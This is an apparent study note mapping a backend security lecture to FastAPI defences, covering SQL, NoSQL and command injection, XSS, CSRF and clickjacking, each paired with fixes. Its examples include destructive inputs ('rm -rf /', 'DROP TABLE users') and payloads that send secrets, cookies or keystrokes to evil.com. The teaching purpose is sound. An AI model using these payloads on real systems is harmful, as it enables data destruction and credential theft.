# Lecture 20: Backend Security - FastAPI Mapping

## 📚 Lecture Overview

**Topic**: Backend Security - Injection Attacks & Browser-Based Vulnerabilities  
**Date Started**: 2026-01-29  
**Status**: 🟡 In Progress

---

## 🎯 Core Philosophy from Your Lecture

> **"Every injection attack fundamentally stems from a single vulnerability: data crossing a boundary and being confused with executable code."**

### **The Root Cause**

**Modern backends communicate across multiple boundaries using different languages:**

```
Backend Application
    ↓ SQL → Database
    ↓ Shell → Operating System  
    ↓ HTML/JS → Browser
```

**Injection occurs when:** User input with special characters (`'`, `;`, `--`) tricks the receiving system into treating **data** as **executable code**.

---

## 💉 Part 1: INJECTION ATTACKS

### **The Fundamental Problem**

```
SAFE:
  Code: "SELECT * FROM users WHERE email = ?"
  Data: "alice@example.com"
  
  Database sees: Code (query) | Data (parameter)

UNSAFE:
  Code + Data mixed: "SELECT * FROM users WHERE email = '" + userInput + "'"
  
  Database sees: Everything as code!
  Attacker can inject: ' OR 1=1 --
```

**Key insight:** When code and data are mixed via string concatenation, attackers can inject special characters that break out of the "data" context into "code" context.

---

## 1️⃣ SQL Injection (SQLi)

### **How It Works**

**Vulnerable Code:**
```python
# ❌ DANGEROUS: String concatenation
email = request.form['email']
query = f"SELECT * FROM users WHERE email = '{email}'"
db.execute(query)
```

**Attack:**
```
Input: ' OR 1=1 --

Resulting Query:
  SELECT * FROM users WHERE email = '' OR 1=1 --'
  
Breakdown:
  ' → Closes the string
  OR 1=1 → Always true condition
  -- → Comments out rest of query
  
Result: Returns ALL users! 💀
```

**Destructive Attack:**
```
Input: '; DROP TABLE users; --

Resulting Query:
  SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
  
Result: Deletes entire users table! 💀💀💀
```

---

### **The Fix: Parameterized Queries**

**Safe Code:**
```python
# ✅ SAFE: Parameterized query
email = request.form['email']
query = "SELECT * FROM users WHERE email = ?"
db.execute(query, (email,))  # Data sent separately!
```

**Why it works:**
```
Query Template (code): "SELECT * FROM users WHERE email = ?"
Parameter (data): "' OR 1=1 --"

Database receives:
  Code: Query structure
  Data: Literal string "' OR 1=1 --"
  
Database treats input as PLAIN STRING, not code!
Special characters like ' are escaped automatically.
```

**FastAPI/SQLAlchemy:**
```python
from sqlalchemy import text

# ✅ SAFE: Named parameters
email = "user_input"
query = text("SELECT * FROM users WHERE email = :email")
result = db.execute(query, {"email": email})

# ✅ SAFE: ORM (automatic parameterization)
user = db.query(User).filter(User.email == email).first()
```

---

## 2️⃣ NoSQL Injection

### **How It Works**

**MongoDB is NOT immune!**

**Vulnerable Code:**
```python
# ❌ DANGEROUS: Direct JSON from user
credentials = request.json  # User controls entire structure!
user = db.users.find_one(credentials)
```

**Attack:**
```json
// Normal input:
{"username": "alice", "password": "secret123"}

// Malicious input:
{"username": "admin", "password": {"$ne": null}}

Resulting MongoDB query:
  db.users.find_one({username: "admin", password: {$ne: null}})
  
Translation: Find user where password is NOT null
Result: Bypasses authentication! 💀
```

---

### **The Fix: Validate Structure**

```python
# ✅ SAFE: Validate and sanitize
from pydantic import BaseModel

class LoginRequest(BaseModel):
    username: str  # Must be string!
    password: str  # Must be string!

@app.post("/login")
def login(credentials: LoginRequest):
    # Pydantic ensures username/password are strings
    # MongoDB operators like $ne are rejected!
    user = db.users.find_one({
        "username": credentials.username,
        "password": hash_password(credentials.password)
    })
```

**Why it works:** Pydantic validation ensures fields are strings, not objects. MongoDB operators like `$ne` are rejected before reaching the database.

---

## 3️⃣ Command Injection (OS)

### **How It Works**

**Vulnerable Code:**
```python
# ❌ DANGEROUS: User input in shell command
filename = request.form['filename']
os.system(f"ffmpeg -i input.mp4 {filename}.mp4")
```

**Attack:**
```
Input: output; rm -rf /

Resulting Command:
  ffmpeg -i input.mp4 output; rm -rf /.mp4
  
Breakdown:
  ; → Command separator
  rm -rf / → Delete everything!
  
Result: Wipes entire file system! 💀💀💀
```

**Other attacks:**
```
Input: output && cat /etc/passwd
Input: output | curl evil.com/steal?data=$(cat secrets.txt)
```

---

### **The Fix: Safe System Calls**

```python
# ✅ SAFE: Use subprocess with array arguments
import subprocess

filename = request.form['filename']

# Pass arguments as array, NOT string
subprocess.run([
    "ffmpeg",
    "-i",
    "input.mp4",
    f"{filename}.mp4"
])

# Shell is NOT invoked!
# ; && | have no special meaning
# Treated as literal strings
```

**Why it works:** Arguments passed as array items, not concatenated into a shell command. Special characters like `;` have no special meaning to the subprocess.

---

## 4️⃣ Cross-Site Scripting (XSS)

### **How It Works**

**XSS = Injecting JavaScript into browser**

**Vulnerable Code:**
```python
# ❌ DANGEROUS: Render user input directly
comment = request.form['comment']
db.save_comment(comment)  # No sanitization!

# Later, in HTML template:
<div>{comment}</div>  # Rendered as-is!
```

**Attack:**
```
Input: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

Rendered HTML:
  <div><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></div>
  
Result: Script executes in victim's browser!
  - Steals session cookies
  - Sends to attacker's server
  - Attacker impersonates user 💀
```

**Other XSS attacks:**
```html
<!-- Redirect to phishing -->
<script>window.location='https://fake-bank.com'</script>

<!-- Keylogger -->
<script>document.onkeypress = e => fetch('https://evil.com/log?key=' + e.key)</script>

<!-- Change page content -->
<script>document.body.innerHTML = '<h1>HACKED</h1>'</script>
```

---

### **The Fix: Sanitization + CSP**

**Layer 1: Sanitize Input**
```python
# ✅ SAFE: Strip dangerous tags
import bleach

comment = request.form['comment']

# Allow only safe tags
clean_comment = bleach.clean(
    comment,
    tags=['p', 'b', 'i', 'em', 'strong'],  # Whitelist
    strip=True  # Remove disallowed tags
)

db.save_comment(clean_comment)
```

**Layer 2: Content Security Policy (CSP)**
```python
from fastapi import Response

@app.get("/")
def index():
    response = Response(content="...")
    
    # ✅ CSP Header: Block inline scripts
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "object-src 'none'"
    )
    
    return response
```

**What CSP does:**
- `default-src 'self'`: Only load resources from same origin
- `script-src 'self' https://trusted-cdn.com`: Only scripts from self or trusted CDN
- Blocks inline `<script>` tags (XSS payload!)
- Even if sanitization fails, CSP blocks execution

**Layer 3: HttpOnly Cookies**
```python
from fastapi import Response

response = Response()
response.set_cookie(
    key="session_id",
    value=session_token,
    httponly=True,  # ✅ JavaScript cannot read this cookie!
    secure=True,     # Only sent over HTTPS
    samesite="lax"   # CSRF protection
)
```

**Result:** Even if XSS executes, it cannot steal session cookie!

---

## 🛡️ Defense in Depth

### **Database Permission Restriction**

**Principle:** Even if SQL injection succeeds, limit damage.

```sql
-- ❌ BAD: Application uses admin account
GRANT ALL PRIVILEGES ON database.* TO 'app_user'@'localhost';

-- Attacker injects: '; DROP TABLE users; --
-- Result: Table deleted! 💀

-- ✅ GOOD: Application uses restricted account
GRANT SELECT, INSERT, UPDATE, DELETE ON database.* TO 'app_user'@'localhost';
-- NO CREATE, DROP, ALTER permissions!

-- Attacker injects: '; DROP TABLE users; --
-- Result: Permission denied! ✅
```

**Separation:**
- **Application account:** DML only (SELECT, INSERT, UPDATE, DELETE)
- **Migration account:** DDL allowed (CREATE, DROP, ALTER)
- **Admin account:** Everything (dev only, never production)

---

## 🌐 Part 2: BROWSER-BASED ATTACKS

### **Cross-Site Request Forgery (CSRF)**

**How It Works:**

```
1. User logs into bank.com
2. Bank sets session cookie
3. User visits evil.com (while still logged in)
4. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
5. Browser automatically attaches bank.com cookies!
6. Bank processes transfer as legitimate! 💀
```

---

### **The Fix: SameSite Cookies**

```python
from fastapi import Response

response = Response()
response.set_cookie(
    key="session_id",
    value=session_token,
    samesite="lax",  # ✅ Cookie NOT sent on cross-site POST!
    httponly=True,
    secure=True
)
```

**SameSite values:**
- `Strict`: Cookie NEVER sent cross-site (even GET)
- `Lax`: Cookie sent on top-level GET, NOT cross-site POST ✅ (recommended)
- `None`: Cookie always sent (dangerous, requires `Secure`)

**With `SameSite=Lax`:**
```
evil.com tries to POST to bank.com/transfer
  → Browser does NOT send bank.com cookies!
  → Request rejected (unauthenticated)
  → Attack fails! ✅
```

---

### **Clickjacking**

**How It Works:**

```html
<!-- evil.com -->
<iframe src="https://bank.com/transfer" style="opacity: 0"></iframe>
<button style="position: absolute">Click here for FREE MONEY!</button>

User clicks "FREE MONEY" button
  → Actually clicks hidden bank.com transfer button!
  → Money transferred to attacker! 💀
```

---

### **The Fix: X-Frame-Options**

```python
from fastapi import Response

@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    
    # ✅ Prevent embedding in iframe
    response.headers["X-Frame-Options"] = "DENY"
    # Or: "SAMEORIGIN" (allow own site to iframe)
    
    return response
```

**Result:** Browser refuses to load your site in iframe from evil.com! ✅

---

## 🔗 FastAPI Documentation Mapping

| Your Lecture Concept | FastAPI Feature | FastAPI Docs | Notes |
|---------------------|-----------------|--------------|-------|
| **SQL Injection Prevention** | SQLAlchemy parameterized queries | [SQL Databases](https://fastapi.tiangolo.com/tutorial/sql-databases/) | Use ORM or `text()` with params |
| **Input Validation** | Pydantic models | [Request Body](https://fastapi.tiangolo.com/tutorial/body/) | Automatic validation |
| **NoSQL Injection Prevention** | Pydantic validation | [Request Body](https://fastapi.tiangolo.com/tutorial/body/) | Validate structure |
| **XSS Prevention** | Response headers | [Custom Response Headers](https://fastapi.tiangolo.com/advanced/response-headers/) | CSP, X-Frame-Options |
| **CSRF Prevention** | Cookie settings | [Response Cookies](https://fastapi.tiangolo.com/advanced/response-cookies/) | SameSite attribute |
| **Security Headers** | Middleware | [Middleware](https://fastapi.tiangolo.com/tutorial/middleware/) | Add headers globally |
| **CORS Configuration** | CORSMiddleware | [CORS](https://fastapi.tiangolo.com/tutorial/cors/) | Restrict origins |
| **HTTPS Enforcement** | Deployment config | [HTTPS](https://fastapi.tiangolo.com/deployment/https/) | Use reverse proxy |

---

### **Pattern 1: SQL Injection Prevention (SQLAlchemy)**

```python
from sqlalchemy import text
from sqlalchemy.orm import Session

# ✅ SAFE: Parameterized query
@app.get("/users/{email}")
def get_user(email: str, db: Session = Depends(get_db)):
    # ORM approach (automatic parameterization)
    user = db.query(User).filter(User.email == email).first()
    
    # OR raw SQL with parameters
    query = text("SELECT * FROM users WHERE email = :email")
    result = db.execute(query, {"email": email})
    
    return user
```

[FastAPI SQL Databases](https://fastapi.tiangolo.com/tutorial/sql-databases/)

---

### **Pattern 2: Input Validation (Pydantic)**

```python
from pydantic import BaseModel, Field, validator

class CommentCreate(BaseModel):
    content: str = Field(..., max_length=1000)
    
    @validator('content')
    def sanitize_content(cls, v):
        import bleach
        # Strip dangerous HTML tags
        return bleach.clean(v, tags=['p', 'b', 'i'], strip=True)

@app.post("/comments")
def create_comment(comment: CommentCreate):
    # Pydantic automatically validates and sanitizes
    # XSS payloads are stripped!
    return {"comment": comment.content}
```

[FastAPI Request Body](https://fastapi.tiangolo.com/tutorial/body/)

---

### **Pattern 3: Security Headers Middleware**

```python
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        
        # Prevent XSS
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' https://trusted-cdn.com; "
            "object-src 'none'"
        )
        
        # Prevent Clickjacking
        response.headers["X-Frame-Options"] = "DENY"
        
        # Force HTTPS
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains"
        )
        
        # Prevent MIME sniffing
        response.headers["X-Content-Type-Options"] = "nosniff"
        
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

[FastAPI Middleware](https://fastapi.tiangolo.com/tutorial/middleware/)

---

### **Pattern 4: Secure Cookies**

```python
from fastapi import Response

@app.post("/login")
def login(credentials: LoginRequest):
    # Authenticate user...
    session_token = create_session(user)
    
    response = Response(content={"status": "logged in"})
    response.set_cookie(
        key="session_id",
        value=session_token,
        httponly=True,   # ✅ XSS cannot steal
        secure=True,     # ✅ HTTPS only
        samesite="lax",  # ✅ CSRF protection
        max_age=3600     # 1 hour
    )
    
    return response
```

[FastAPI Response Cookies](https://fastapi.tiangolo.com/advanced/response-cookies/)

---

### **Pattern 5: CORS Configuration**

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://myapp.com",        # Production frontend
        "http://localhost:3000"     # Dev frontend
    ],
    allow_credentials=True,  # Allow cookies
    allow_methods=["GET", "POST"],  # Whitelist methods
    allow_headers=["Content-Type", "Authorization"]
)
```

[FastAPI CORS](https://fastapi.tiangolo.com/tutorial/cors/)

---

## 🎓 Mastery Checklist

- [ ] Understand the root cause: data confused with code?
- [ ] Explain SQL injection and parameterized queries?
- [ ] Prevent NoSQL injection with Pydantic validation?
- [ ] Prevent command injection with subprocess arrays?
- [ ] Sanitize user input to prevent XSS?
- [ ] Implement Content Security Policy (CSP)?
- [ ] Set HttpOnly cookies?
- [ ] Configure SameSite cookies for CSRF protection?
- [ ] Prevent clickjacking with X-Frame-Options?
- [ ] Restrict database permissions (DML vs DDL)?
- [ ] Implement security headers middleware?
- [ ] Configure CORS properly?

---

## 📍 Security in Architecture

```
HTTP Request (User Input)
    ↓
[Input Validation Layer]
    ├─ Pydantic: Validate types/structure
    ├─ Sanitization: Strip dangerous content
    └─ Reject if invalid (400)
    ↓
[Business Logic Layer]
    ├─ Parameterized Queries (SQL)
    ├─ Safe Subprocess Calls (OS)
    └─ Never concatenate user input!
    ↓
[Database Layer]
    ├─ Restricted Permissions (DML only)
    └─ Defense in Depth
    ↓
[Response Layer]
    ├─ Security Headers (CSP, X-Frame-Options)
    ├─ HttpOnly Cookies
    └─ SameSite Cookies
    ↓
Response (Secure)
```

---

**Last Updated**: 2026-01-29  
**Status**: ✅ Mapping Complete  
**Practice File**: backend_security_complete.py (next)
